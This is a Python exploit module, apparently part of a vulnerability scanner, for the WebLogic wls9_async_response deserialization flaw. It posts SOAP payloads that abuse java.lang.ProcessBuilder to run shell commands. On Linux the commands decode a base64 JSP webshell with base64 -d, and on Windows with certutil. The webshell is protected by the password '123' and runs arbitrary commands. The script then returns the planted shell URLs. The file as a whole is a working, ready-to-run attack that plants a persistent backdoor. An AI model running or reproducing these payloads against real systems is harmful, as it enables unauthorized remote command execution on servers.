#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化RCE
# https://saucer-man.com/information_security/129.html
"""
Copyright (c) saucerman (https://saucer-man.com)
See the file 'LICENSE' for copying permission
"""


from urllib.parse import urlparse
from lib.core.Request import request
import time

post_headers = {
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
    "Content-Type": "text/xml",
    }
get_headers ={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36", 
}

def linux_check_1(url, webshell_path):
    linux_payload_1 = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
        <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>/bin/bash</string>
        </void>
        <void index="1">
        <string>-c</string>
        </void>
        <void index="2">
        <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls9_async_response/8tpkys/war/webshell1.jsp</string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
        <asy:onAsyncDelivery/>
        </soapenv:Body></soapenv:Envelope>"""

    try:
        attack_url = url + '/_async/AsyncResponseService'
        request.post(url=attack_url, data=linux_payload_1, headers=post_headers, timeout=5, verify=False)
        jsp_path = url + '/_async/webshell1.jsp'
        time.sleep(1)
        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
        if r.status_code == 200:
            webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
        else:
            pass
            # print("第一种方式失败")
    except Exception as e:
        pass
        # print("第一种方式出错")
        # print(e)

def linux_check_2(url, webshell_path):
    linux_payload_2 = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
        <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>/bin/bash</string>
        </void>
        <void index="1">
        <string>-c</string>
        </void>
        <void index="2">
        <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4= |base64 -d > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell2.jsp</string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
        <asy:onAsyncDelivery/>
        </soapenv:Body></soapenv:Envelope>"""

    try:
        attack_url = url + '/_async/AsyncResponseService'
        request.post(url=attack_url, data=linux_payload_2, headers=post_headers, timeout=5, verify=False)
        jsp_path = url + '/bea_wls_internal/webshell2.jsp'
        time.sleep(1)
        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
        if r.status_code == 200:
            webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
        else:
            pass
            # print("第二种方式失败")
    except Exception as e:
        pass
        # print("第二种方式出错")
        # print(e)

def windows_check_1(url, webshell_path):
    windows_payload_1_1 = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
        <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string>
        </void>
        <void index="1">
        <string>/c</string>
        </void>
        <void index="2">
        <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  > servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell3.txt</string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
        <asy:onAsyncDelivery/>
        </soapenv:Body></soapenv:Envelope>"""
    windows_payload_1_2 = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
        <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string>
        </void>
        <void index="1">
        <string>/c</string>
        </void>
        <void index="2">
        <string>certutil -decode servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell3.txt servers\AdminServer\tmp\_WL_internal\bea_wls9_async_response\8tpkys\war\webshell3.jsp</string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
        <asy:onAsyncDelivery/>
        </soapenv:Body></soapenv:Envelope>"""
    try:
        attack_url = url + '/_async/AsyncResponseService'
        request.post(url=attack_url, data=windows_payload_1_1, headers=post_headers, timeout=5, verify=False)
        time.sleep(1)
        request.post(url=attack_url, data=windows_payload_1_2, headers=post_headers, timeout=5, verify=False)
        time.sleep(1)
        jsp_path = url + '/_async/webshell3.jsp'
        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
        if r.status_code == 200:
            webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
        else:
            pass
            # print("第三种方式失败")
    except Exception as e:
        pass
        # print("第三种方式出错")
        # print(e)  

def windows_check_2(url, webshell_path):
    windows_payload_2_1 = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
        <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string>
        </void>
        <void index="1">
        <string>/c</string>
        </void>
        <void index="2">
        <string>echo PCUKICAgIGlmKCIxMjMiLmVxdWFscyhyZXF1ZXN0LmdldFBhcmFtZXRlcigicHdkIikpKXsKICAgICAgICBqYXZhLmlvLklucHV0U3RyZWFtIGluID0gUnVudGltZS5nZXRSdW50aW1lKCkuZXhlYyhyZXF1ZXN0LmdldFBhcmFtZXRlcigiY21kIikpLmdldElucHV0U3RyZWFtKCk7CiAgICAgICAgaW50IGEgPSAtMTsgICAgICAgICAgCiAgICAgICAgYnl0ZVtdIGIgPSBuZXcgYnl0ZVsxMDI0XTsgICAgICAgICAgCiAgICAgICAgb3V0LnByaW50KCI8cHJlPiIpOyAgICAgICAgICAKICAgICAgICB3aGlsZSgoYT1pbi5yZWFkKGIpKSE9LTEpewogICAgICAgICAgICBvdXQucHJpbnRsbihuZXcgU3RyaW5nKGIpKTsgICAgICAgICAgCiAgICAgICAgfQogICAgICAgIG91dC5wcmludCgiPC9wcmU+Iik7CiAgICB9IAogICAgJT4=  > servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell4.txt</string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
        <asy:onAsyncDelivery/>
        </soapenv:Body></soapenv:Envelope>"""
    windows_payload_2_2 = r"""<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:wsa="http://www.w3.org/2005/08/addressing" xmlns:asy="http://www.bea.com/async/AsyncResponseService">   
        <soapenv:Header> 
        <wsa:Action>xx</wsa:Action>
        <wsa:RelatesTo>xx</wsa:RelatesTo>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
        <void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
        <void index="0">
        <string>cmd</string>
        </void>
        <void index="1">
        <string>/c</string>
        </void>
        <void index="2">
        <string>certutil -decode servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell4.txt servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/webshell4.jsp</string>
        </void>
        </array>
        <void method="start"/></void>
        </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body>
        <asy:onAsyncDelivery/>
        </soapenv:Body></soapenv:Envelope>"""
    try:
        attack_url = url + '/_async/AsyncResponseService'
        request.post(url=attack_url, data=windows_payload_2_1, headers=post_headers, timeout=5, verify=False)
        time.sleep(1)
        request.post(url=attack_url, data=windows_payload_2_2, headers=post_headers, timeout=5, verify=False)
        time.sleep(1)
        jsp_path = url + '/bea_wls_internal/webshell4.jsp'
        r = request.get(url=jsp_path, headers=get_headers, timeout=5, verify=False)
        if r.status_code == 200:
            webshell_path.append("{}?pwd=123&cmd=whoami".format(jsp_path))
        else:
            pass
            # print("第四种方式失败")
    except Exception as e:
        pass
        # print("第四种方式出错")
        # print(e)    

def poc(url):
    # 首先对url进行处理
    # url = "http://www.example.org:7001/default.html?ct=32&op=92&item=98"
    # --> http://www.example.org:7001
    if url[:4] != "http":
        url = "http://" + url
    o = urlparse(url)
    url = o.scheme + "://" + o.netloc
    

    # 首先判断attack_url是否可访问
    try:
        attack_url = url + '/_async/AsyncResponseService'
        r = request.get(url=attack_url, headers=get_headers, timeout=4, verify=False)
        if r.status_code != 200:
            return []
    except:
        return []

    # 因为不知道目标是linux还是windows，所以直接都检验一遍
    # 如果存在漏洞，则将shell路径保存在webshell_path中
    webshell_path = []
    linux_check_1(url, webshell_path)
    linux_check_2(url, webshell_path)
    windows_check_1(url, webshell_path)
    windows_check_2(url, webshell_path)

    return webshell_path

